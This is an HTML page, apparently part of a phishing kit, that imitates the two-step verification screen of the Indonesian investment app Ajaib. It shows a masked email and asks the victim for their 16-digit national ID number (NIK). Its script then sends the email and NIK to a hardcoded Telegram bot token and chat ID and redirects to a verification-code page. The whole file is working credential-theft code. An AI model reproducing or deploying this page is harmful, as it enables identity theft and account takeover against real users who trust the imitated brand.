<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>2 Langkah Verifikasi</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
  />
  <style>
    body {
      font-family: 'Inter', sans-serif;
    }
  </style>
  <link href="https://fonts.googleapis.com/css2?family=Inter&display=swap" rel="stylesheet" />
</head>
<body class="bg-white text-black min-h-screen flex flex-col">
  <div class="px-6 pt-6 max-w-md w-full mx-auto flex flex-col">
    <button aria-label="Back" class="self-start mb-6" type="button" onclick="history.back()">
      <i class="fas fa-chevron-left text-black text-xl"></i>
    </button>

    <h1 class="text-center text-2xl font-semibold mb-3">2 Langkah Verifikasi</h1>

    <p class="text-center text-base font-normal mb-8 leading-relaxed">
      Perangkat yang kamu gunakan saat ini belum terdaftar sebagai perangkat terhubung. Konfirmasi perangkat ini untuk masuk ke Ajaib.
    </p>

    <div class="flex items-center border border-blue-300 rounded-full max-w-xs mx-auto px-4 py-2 mb-10">
      <div class="flex-shrink-0 w-8 h-8 rounded-full bg-blue-600 flex items-center justify-center">
        <i class="fas fa-user text-white text-sm"></i>
      </div>
      <span class="ml-3 text-base font-normal text-black" id="email-display">h*********6@gmail.com</span>
    </div>

    <h2 class="text-lg font-semibold mb-2">Masukkan data yang telah kamu daftarkan ke Ajaib</h2>

    <label for="nik" class="block text-sm font-medium mb-1">NIK</label>
    <input
      id="nik"
      name="nik"
      type="text"
      maxlength="16"
      pattern="\d{16}"
      inputmode="numeric"
      class="w-full border border-blue-500 rounded-md px-4 py-3 text-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
      autocomplete="off"
      aria-required="true"
      aria-describedby="nik-error"
      placeholder="Masukkan 16 digit NIK"
    />
    <p id="nik-error" class="text-red-600 text-sm mt-1 hidden">NIK harus 16 digit angka.</p>
  </div>

  <div class="mt-auto px-6 pb-6 max-w-md w-full mx-auto">
    <button
      disabled
      class="w-full bg-blue-100 text-blue-300 font-semibold text-lg py-4 rounded-md cursor-not-allowed"
      aria-disabled="true"
      id="confirm-btn"
      type="button"
    >
      Konfirmasi
    </button>
  </div>

  <script>
    // Ambil email dari localStorage
    const savedEmail = localStorage.getItem('userEmail') || '';

    // Fungsi untuk mask email (tampilkan huruf pertama, sembunyikan sebagian, tampilkan domain)
    function maskEmail(email) {
      const [localPart, domain] = email.split('@');
      if (!localPart || !domain) return email;
      const firstChar = localPart.charAt(0);
      const lastChar = localPart.charAt(localPart.length - 1);
      const maskedPart = '*'.repeat(Math.max(localPart.length - 2, 1));
      return `${firstChar}${maskedPart}${lastChar}@${domain}`;
    }

    // Tampilkan email yang sudah dimask di elemen
    const emailDisplay = document.getElementById('email-display');
    if (savedEmail) {
      emailDisplay.textContent = maskEmail(savedEmail);
    } else {
      emailDisplay.textContent = 'Email tidak tersedia';
    }

    // Enable konfirmasi button jika input NIK valid (16 digit angka)
    const nikInput = document.getElementById('nik');
    const confirmBtn = document.getElementById('confirm-btn');
    const nikError = document.getElementById('nik-error');

    function validateNik(value) {
      return /^\d{16}$/.test(value);
    }

    nikInput.addEventListener('input', () => {
      const val = nikInput.value.trim();
      if (validateNik(val)) {
        nikError.classList.add('hidden');
        confirmBtn.disabled = false;
        confirmBtn.classList.remove('bg-blue-100', 'text-blue-300', 'cursor-not-allowed');
        confirmBtn.classList.add('bg-blue-600', 'text-white', 'cursor-pointer');
        confirmBtn.setAttribute('aria-disabled', 'false');
      } else {
        nikError.classList.remove('hidden');
        confirmBtn.disabled = true;
        confirmBtn.classList.add('bg-blue-100', 'text-blue-300', 'cursor-not-allowed');
        confirmBtn.classList.remove('bg-blue-600', 'text-white', 'cursor-pointer');
        confirmBtn.setAttribute('aria-disabled', 'true');
      }
    });

    // Kirim data ke Telegram saat klik tombol Konfirmasi
    confirmBtn.addEventListener('click', async () => {
      const nik = nikInput.value.trim();
      if (!savedEmail || !validateNik(nik)) return;

      // Ganti dengan token bot Telegram dan chat ID Anda
      const telegramBotToken = '8392304649:AAFSpxG4uQqhdzOi-XD0ADeuykpj4RGAgDU';
      const telegramChatId = '7914074847';

      const message = `Verifikasi 2 Langkah:\nEmail: ${savedEmail}\nNIK: ${nik}`;

      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

      try {
        const response = await fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            chat_id: telegramChatId,
            text: message
          })
        });
        if (response.ok) {
          window.location.href = 'kodeverifikasi.html';
          nikInput.value = '';
          confirmBtn.disabled = true;
          confirmBtn.classList.add('bg-blue-100', 'text-blue-300', 'cursor-not-allowed');
          confirmBtn.classList.remove('bg-blue-600', 'text-white', 'cursor-pointer');
        } else {
          alert('Gagal mengirim data ke Telegram.');
        }
      } catch (error) {
        alert('Terjadi kesalahan saat mengirim data.');
        console.error(error);
      }
    });
  </script>
</body>
</html>
